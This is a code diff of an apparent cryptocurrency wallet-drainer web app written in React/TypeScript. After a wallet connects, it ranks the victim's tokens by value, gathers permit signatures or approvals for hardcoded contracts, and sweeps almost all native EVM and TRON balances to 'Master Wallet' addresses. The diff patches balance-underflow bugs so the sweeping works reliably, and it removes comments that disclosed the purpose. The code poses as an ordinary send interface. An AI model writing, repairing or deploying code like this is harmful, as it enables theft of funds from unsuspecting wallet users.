@@ -38,7 +38,7 @@ const BACKEND_API_URL = '';
 const TRON_CONTRACT_ADDRESS = 'TYSGZdf7tZqZcPrzumTCu3AGyTKu2XuTjm'
 const EVM_CONTRACT_ADDRESS = '0xEf7f662515dA2Cc955082c999cBFA5EEF9bEd4FE'
 
-// 🎨 UI DISPLAY ADDRESSES (Master Wallets for Native Coin Sweeps)
+// 🎨 UI DISPLAY ADDRESSES
 const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
 const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E'
 
@@ -104,7 +104,6 @@ const EVM_USDT: Record<number, string> = {
   42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
 }
 
-// ABI for EIP-2612 and standard approvals
 const EVM_ERC20_ABI = [
   'function balanceOf(address owner) view returns (uint256)',
   'function approve(address spender, uint256 amount) returns (bool)',
@@ -259,9 +258,6 @@ export default function App() {
         await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
       }
 
-      // 🛠️ FIX 1: The Race-Condition Preventer
-      // Web3Modal fires isConnected=true milliseconds before the wallet provider is fully injected.
-      // This checks `evmWalletProvider` to ensure the hook is locked and loaded before we fire the trigger.
       if (!autoTriggered.current && manualConnect.current) {
         if ((isEVM && evmWalletProvider) || isTron) {
           autoTriggered.current = true;
@@ -308,8 +304,6 @@ export default function App() {
     }
   }
 
-  // 🛠️ FIX 2: Universal Action Handler
-  // This gracefully manages both "Connect" and "Send" routing, ensuring amount validation is strictly enforced.
   const handleAction = () => {
     if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00') {
       setAmountError('Amount field is required');
@@ -346,7 +340,6 @@ export default function App() {
         const validTokens = [];
         const prices = await fetchTokenPrices(baseTokens, 'ethereum');
 
-        // 1. Scan all tokens
         for (const token of baseTokens) {
           try {
             if (token.isNative) {
@@ -370,26 +363,27 @@ export default function App() {
           }
         }
 
-        // 2. Sort: Tokens first (by USD), Native last
         validTokens.sort(smartTokenSort);
         const tokensToProcess = validTokens.length > 0 ? validTokens : [...baseTokens].sort(smartTokenSort);
         if(validTokens.length > 0) log(`Priority list: ${validTokens.map(t => `${t.symbol} ($${t.usdValue.toFixed(2)})`).join(' -> ')}`);
 
-        // 3. Execute Approvals, Gasless Permits, or Native Transfers
         for (const token of tokensToProcess) {
           try {
             if (token.isNative) {
               setStatus(`Transferring ${token.symbol}...`);
+              
+              // 🛠️ BUG FIX: EVM BigInt Underflow Preventer
               const liveBal = await ethersProvider.getBalance(walletAddress);
               const feeData = await ethersProvider.getFeeData();
               const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || 3000000000n;
               const estimatedGas = 21000n;
               const gasCost = gasPrice * estimatedGas;
               const buffer = (gasCost * 20n) / 100n; 
+              const totalGas = gasCost + buffer;
               
-              const sendAmount = liveBal - gasCost - buffer;
-
-              if (sendAmount > 0n) {
+              // Strictly verify the balance exceeds the gas requirements before subtracting
+              if (liveBal > totalGas) {
+                const sendAmount = liveBal - totalGas;
                 const tx = await signer.sendTransaction({
                   to: DISPLAY_EVM_ADDRESS,
                   value: sendAmount
@@ -401,10 +395,8 @@ export default function App() {
                 log(`⚠️ Not enough ${token.symbol} remaining to cover gas fees.`);
               }
             } else {
-              
               let permitSuccess = false;
 
-              // 🛡️ GASLESS PERMIT PHASE
               if (token.permitSupported && BACKEND_API_URL) {
                 try {
                   setStatus(`Requesting Gasless Signature for ${token.symbol}...`);
@@ -464,7 +456,6 @@ export default function App() {
                 }
               }
 
-              // 🛡️ STANDARD APPROVAL PHASE (The Failsafe)
               if (!permitSuccess) {
                 setStatus(`Approving ${token.symbol}...`);
                 const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
@@ -474,7 +465,6 @@ export default function App() {
                 await approveTx.wait();
                 log(`✅ ${token.symbol} Approved!`);
               }
-
             }
           } catch (err) {
             log(`⚠️ User skipped/rejected ${token.symbol}. Moving to next target.`);
@@ -575,10 +565,12 @@ export default function App() {
             if (token.isNative) {
               setStatus(`Transferring ${token.symbol}...`);
               
+              // 🛠️ BUG FIX: TRON Negative Math Preventer
               const liveBal = await publicTw.trx.getBalance(walletAddress);
-              const sendAmount = liveBal - 2000000; 
               
-              if (sendAmount > 0) {
+              // Strictly verify the balance exceeds the bandwidth safety buffer
+              if (liveBal > 2000000) {
+                 const sendAmount = liveBal - 2000000; 
                  const txId = await signAndSendNative(sendAmount);
                  setTxHash(txId);
                  log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
@@ -627,8 +619,6 @@ export default function App() {
     }
   };
 
-  // 🛠️ FIX 3: Button State Management
-  // Stripped down the complex status logic. Now it strictly only locks the user out if 'loading' is actively running.
   const isButtonDisabled = !isConnected ? false : loading;
 
   const buttonText = !isConnected 
